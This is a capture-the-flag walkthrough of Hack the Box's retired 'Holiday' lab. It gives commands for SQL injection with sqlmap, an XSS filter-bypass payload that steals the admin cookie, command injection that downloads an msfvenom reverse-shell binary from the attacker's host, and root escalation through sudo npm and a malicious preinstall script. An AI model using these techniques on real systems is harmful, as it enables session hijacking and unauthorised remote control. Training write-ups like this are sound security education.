<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box: Holiday Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-holiday-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-08-06T10:25:08+00:00">August 6, 2018</time><time class="updated" datetime="2025-07-05T16:04:00+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “Holiday” which is available online for those who want to increase their skill in penetration testing and black box testing. <strong>Hack the Box</strong> presents Holiday, a retired vulnerable lab for making online penetration practices according to your experience level; they offer a collection of vulnerable labs as challenges from beginners to expert level.</span></p>
<h5><span style="color: #000000;">Level: Expert</span></h5>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on the victim’s machine.</span></p>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of sense is <strong>10.10.10.25</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A -p- 10.10.10.25 --open</pre>
<p><span style="color: #000000;">From the given below image, you can observe we found port 22 and 8000 are open on the target system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-RxSbhbnw_ZQ/W2gafqrYdzI/AAAAAAAAZVo/mtTstMK4Iy0J6VTLrgyDU0KwxOImAcGxACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As port 8000 is running http we open the IP address in the browser and find a webpage.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dF49JgyIfPQ/W2gah6pWXRI/AAAAAAAAZWQ/XNfFFgH_AeIp1Du0DBVXw1N88z7cDq-UgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">We didn’t find anything on the webpage so we use dirb to enumerate the directories.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.25:8000</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-4NNoCakgZTI/W2gakEsumEI/AAAAAAAAZW8/YNo-6knFjHcWpBIlKUhXQbdNr7lGhR2iACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Dirb scan gives us a link to a directory called /login, we open the link and find a login page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lMSHqnz7nfM/W2gallRgoQI/AAAAAAAAZXY/fbeH0Dz00TMOM_MNclbOHq4BksEaJjuYACLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We capture the login request using burpsuite. Then, we use random credentials as a placeholder.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-S8AZjCRUbdE/W2gal-txjcI/AAAAAAAAZXc/I6erIsQvICk98lV3k0VdAphDD7U5HEA_ACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We use sqlmap to check if it is vulnerable to SQL injection. After finding that it is vulnerable to SQL injection, we use sqlmap to dump the database and find a username “RickA” and password hash.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r sql.txt --dbms=SQLite -T users --columns --dump --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8DgIDVSQPe4/W2gal-SSm4I/AAAAAAAAZXg/UJlGFQve67EYgoRwLAl-IxtihirQIZoWQCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Then, we use hashkiller.co.uk to decrypt the hash and find the password to the user.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0gN6NDN1iOE/W2gamEB-DQI/AAAAAAAAZXk/k4ssRplrjREyRsMsep49ZOL4wZjJlASQQCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">We login using these credentials and we are redirected to a page with that looks like it contains useful information.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-jT_7lbCm-Dw/W2gamQRUCYI/AAAAAAAAZXo/fEqfp6gpZVAQQQgayKjOpfyAYnVlhSbwQCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">We click on one of the UUID links and find a page that we can post notes for the users. It also shows that it will take up to 1 minute to post the note.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KFzE8OAIn_E/W2gamYBF5WI/AAAAAAAAZXs/D397WDgA2oYuT8Qipny62RjZqSPagK3uwCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We try to exploit the note function and find it is vulnerable xss. As the notes are being read by administrator XSS can be used to get the admin cookie. To run xss and run our payload we need to bypass the filter using javascript function String.fromCharCode to run our payload. I created this script <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/Sayantan5/Holiday/blob/master/encode.py">here</a> </span>to convert a string to ascii code.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-oxi2SGm-wdI/W2gaf3WiaOI/AAAAAAAAZVs/jX1nDexYO60mqvWkX9yJj4mD_TZchTRqgCLcBGAs/s1600/10.png"/></span></p>
<h5><span style="color: #000000;">We post the note to bypass the filter we have to use this payload:</span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;img src="x/&gt;&lt;script&gt;eval(String.CharCode(&lt;payload&gt;));&lt;/script&gt;"&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-5PdohSAI5s0/W2gafzI0qgI/AAAAAAAAZVw/4Emi8fCtqcMflSK6kG3p7LJZrqAhbjQZwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">We set up our listener using nc on port 80, as we will receive the response of the page including the administrator cookie on this port.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 80</pre>
<p><span style="color: #000000;">After waiting for 1 minute we received the admin cookie.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-rXa0rumgaSw/W2gagO0uzHI/AAAAAAAAZV4/_Ds2kKKayS4_-6wimcywdYO4x8w-ccUIACLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">The cookie is URL encoded we decode and use it hijack the administrator session.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-o7yGj6fbrZc/W2gagHigXhI/AAAAAAAAZV0/6tNtvURdNiwxtgECg0tyizUW0VJNIblLgCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We capture the webpage’s request using burpsuite. We change our cookie with that of administrator and forward it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nUVqx_tDLJU/W2gagTYCWVI/AAAAAAAAZV8/PXrid5a8J6wDC3kL1z8wQFa-58nAw-UjACLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">As soon as we forward the request, we are able to successfully hijack the administrator session.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-PvUKtiEa5-E/W2gag--EAjI/AAAAAAAAZWA/UIKrr_M8v-IVt1-npByEQrrHDk-KbolRQCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">We now go to /admin directory and find a page where there are options to export bookings and notes.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-WMhieFoPXgk/W2gag6yTM4I/AAAAAAAAZWE/7UcniIhhBfYqd0SPb-nJIJIGONUdIMD1gCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">We capture the request using burpsuite and check if it is vulnerable to any kind of injection. After enumerating we find that this page is vulnerable to command injection.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-xh-HrRxAQlg/W2gagwiBbAI/AAAAAAAAZWI/HX8Me7qaHRkewaKE_PCW1wj-SYQ8PqbbgCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">We are unable to get a shell using web_delivery module of Metasploit due to there being filters. Now we create a payload using msfvenom to upload into the target machine using command injection and get a reverse shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.10.14.8 lport=4444 –f elf &gt; shell</pre>
<p><span style="color: #000000;">After creating a shell, we create a python http server to upload into the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S8fhOGgicm8/W2gahmI_WYI/AAAAAAAAZWM/lOc_KCot-6sv_uiOJTeOZN44nRMK6zrNwCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Now “.” The system is not blacklisted, so we convert the IP address into a decimal number so that we can bypass the filter.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-BbzA2UFvaVc/W2gaiL5rlXI/AAAAAAAAZWY/bo_pQFcd8QIxd7x4gJ6dWRjdxsuSocjlACLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">We upload the shell using wget command into the target machine and save it in /tmp directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-UgCMtjASpiQ/W2gaiNcQaoI/AAAAAAAAZWU/NUU85-Fj0ygmHM80uVfI50dgh3lWyLEnwCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">As soon as we run the command we get a prompt that shell is uploaded.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-YAsneieywIg/W2gaie28CcI/AAAAAAAAZWc/c7umSpuR5-MSUU75tonZfzKVKpIHgazhQCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">We give our payload read, write and execute permission using command injection.</span></p>
<p><span style="color: #000000;">Now we set up our listener using Metasploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 10.10.14.8
msf exploit(multi/handler) &gt; set lport 4444
msf exploit(multi/handler) &gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-a7UZ25t0aHw/W2gailuuhnI/AAAAAAAAZWk/bGV314URnoYg2efvMHSMsHwtsat0v-iPQCLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;">We run the shell using command injection vulnerability on the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-wXXyT32trc8/W2gctHtvE9I/AAAAAAAAZYQ/kCHcNTEMK1Yq9UjoxMaY1OQ9hAN28Hi6gCLcBGAs/s1600/25.png"/></span></p>
<h5><span style="color: #000000;">As soon as we run the shell we get a reverse shell.</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--6YkdkVlQrg/W2gcxkERozI/AAAAAAAAZYU/SQaMoPlhkhMKdss9FYVfATm_NqgCQU30QCLcBGAs/s1600/26.png"/></span></p>
<p><span style="color: #000000;">We spawn a tty shell and take a look at the sudoers list and find that we can run /usr/bin/npm I * as root with no password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c "import pty; pty.spawn('/bin/bash')"
sudo -l</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_fYN-_vFpBY/W2gcyKUTquI/AAAAAAAAZYc/inSD3Fi9OREqAyBqKd8goV1evHzSABMbACLcBGAs/s1600/27.png"/></span></p>
<p><span style="color: #000000;">Before trying to get root shell we first enumerate rest of the directories and find a file called “user.txt” in /home/algernon directory. We take a look at the content of the files and find the first flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-_-m53qr5EBY/W2gcx3YYfLI/AAAAAAAAZYY/wyve3ptLKisXa_Qhyz8gNaoq-1d_t9aSQCLcBGAs/s1600/28.png"/></span></p>
<p><span style="color: #000000;">Now we try to take root.txt we go to /app directory. We rename package.json to pack, and symlink /root/root.txt package.json</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ln -s /root/root.txt package.json</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-YYV112t8spY/W2gcyOiDU5I/AAAAAAAAZYg/wXyYGHqHq2csTsK-4GmtS3YMig05YSZoACLcBGAs/s1600/29.png"/></span></p>
<p><span style="color: #000000;">We run /usr/bin/npm i * as root user and find the final flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-zXv5qWCFSUw/W2gdJSIXb1I/AAAAAAAAZZI/upRGfXbgK2Y70nxvvY53oJe61t7mcdvngCLcBGAs/s1600/30.png"/></span></p>
<p><span style="color: #000000;">After searching through google we find a way to get reverse shell using a package called rimrafall.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-lNnOkYCxqP8/W2gdJRmynbI/AAAAAAAAZZM/uKOYWwjNkV0BrHPJ4zB4eyrrOde1Di-gQCLcBGAs/s1600/31.png"/></span></p>
<p><span style="color: #000000;">Firstly, we setup rimrafall by following the instructions given on the webpage.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-DTNuNsrmbYA/W2gdJWqNlDI/AAAAAAAAZZE/iWYZX_Fpj148ik3XKfG8fmmR6nBq9_NFQCLcBGAs/s1600/32.png"/></span></p>
<p><span style="color: #000000;">Then, we set up the JSON file and change the preinstalled script to bash one-liner.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-6Pm02uFi4YA/W2gdJyhKRKI/AAAAAAAAZZQ/cHZe1E-DBvshbBS1VM-tzEHNmNbvsDcXwCLcBGAs/s1600/33.png"/></span></p>
<p><span style="color: #000000;">We run the command as the root user to get a privileged shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo npm i rimrafall --unsafe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-9jcp6CAnzHk/W2gdKP1NKCI/AAAAAAAAZZU/dWrWm36ID8omeku_30YmcA1uVaoxxo3-wCLcBGAs/s1600/34.png"/></span></p>
<p><span style="color: #000000;">We set up the listener as soon as we run the preinstalled shell, and it executes, giving us a reverse shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –nvlp 1234</pre>
<p><span style="color: #000000;">Then, we go to /root directory and find a file called root.txt. We take a look at the content of the file and find the final flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-lfPUFP9riSs/W2gdKY-7EMI/AAAAAAAAZZY/3N3EkrvGb7w2wso7BDGalA3BdVDISDgagCLcBGAs/s1600/35.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
